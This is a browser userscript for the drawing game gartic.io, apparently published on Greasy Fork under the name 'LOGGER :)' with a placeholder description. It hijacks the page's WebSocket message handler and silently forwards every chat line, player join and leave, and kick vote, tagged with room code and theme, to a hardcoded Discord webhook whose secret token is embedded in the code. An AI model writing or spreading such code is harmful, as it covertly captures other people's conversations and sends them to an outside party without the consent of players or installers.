// ==UserScript==
// @name         LOGGER :)
// @version      1
// @description  asd
// @author       XELOPRESTİGE
// @match        https://gartic.io/*
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_addValueChangeListener
// @grant        GM_openInTab
// @namespace https://greasyfork.org/users/1541564
// @downloadURL https://update.greasyfork.org/scripts/556913/LOGGER%20%3A%29.user.js
// @updateURL https://update.greasyfork.org/scripts/556913/LOGGER%20%3A%29.meta.js
// ==/UserScript==

function sendMessageToDiscord(content) {
    const message = { content: content };
    const webhookUrl = 'https://discord.com/api/webhooks/1330996990447718562/j-OWXaqJzVFpKi01hga4W87lbkqLWYt5AiTLY9xew3yuFtQQOsfj9L4PZjD_FUkmnk7l';

    fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(message),
    })
        .then(response => {
        if (response.ok) {
            console.log("Mesaj başarıyla gönderildi.");
        } else {
            console.error("Mesaj gönderilirken hata oluştu:", response.statusText);
        }
    })
        .catch(error => {
        console.error("Fetch hatası:", error);
    });
}

(function() {
    'use strict';
    var players = [];
    const createPlayerElement=a=>{players.find((t=>t.id===a.id))||players.push({id:a.id,name:a.nick,avatar:a.foto??`https://gartic.io/static/images/avatar/svg/${a.avatar}.svg`})};
    const getPlayerNameById=e=>{const a=players.find((a=>a.id===e));return a?a.name:""};
    const {addEventListener:originalAddEventListener}=WebSocket.prototype;


    location.href.includes('gartic.io') && (
        (() => {

            var tarih = new Date().toLocaleDateString();

            Object.defineProperty(WebSocket.prototype, 'onmessage', {
                set(onmessageCallback) {
                    const messageHandlers = {
                        '5': (data) => {
                            console.log(data)
                            var [_, AccountID, id, roomid, roominfo, users] = data;
                            users = Array.isArray(users) ? users : Object.values(users);
                            users.forEach(user => { createPlayerElement(user) });
                            (this.AccountID = AccountID, this.id = id, this.roomcode = roominfo.codigo ,this.roomtema = roominfo.tema);
                        },
                        '11': (data) => {
                            var nick = getPlayerNameById(data[1]);
                            sendMessageToDiscord(`${this.roomtema} #${this.roomcode} [${tarih} ${new Date().toLocaleTimeString()}] ${nick}: ${data[2]}`);
                        },
                        '23': (data) => {
                            createPlayerElement(data[1])
                            sendMessageToDiscord(`${this.roomtema} #${this.roomcode} [${tarih} ${new Date().toLocaleDateString()}] (✓)SYSTEM: ${data[1].nick} ${CACHE_DATA.lang.chat.joined.replace("###", "")}`)
                        },
                        '24': (data) => {
                            sendMessageToDiscord(`${this.roomtema} #${this.roomcode} [${tarih} ${new Date().toLocaleDateString()}] (✓)SYSTEM: ${getPlayerNameById(data[1])} ${CACHE_DATA.lang.chat.left.replace("###", "")}`)
                            players = players.filter(player => player.id !== data[1]);
                        },

                        '45': (data) => {
                            sendMessageToDiscord(`${this.roomtema} #${this.roomcode} [${new Date().toLocaleDateString()} ${new Date().toLocaleTimeString()}] (✓)SYSTEM: ${CACHE_DATA.lang.chat.votingKick.replace("###", getPlayerNameById(data[1])).replace("###", getPlayerNameById(data[2]))}`);
                        }
                    };

                    const parseAndProcessMessage = (rawData) => {
                        if (rawData.startsWith('42[')) {
                            try {
                                var data = JSON.parse(rawData.slice(2));
                                var messageType = data[0];
                                var handler = messageHandlers[messageType];
                                if (handler) handler(data);
                            } catch (error) {
                                console.error('Error parsing message:', error);
                            }
                        }
                    };

                    originalAddEventListener.call(this, 'message', (messageEvent) => {
                        parseAndProcessMessage(messageEvent.data);
                        onmessageCallback?.call(this, messageEvent);
                    });
                },
            });
        })()
    )

})();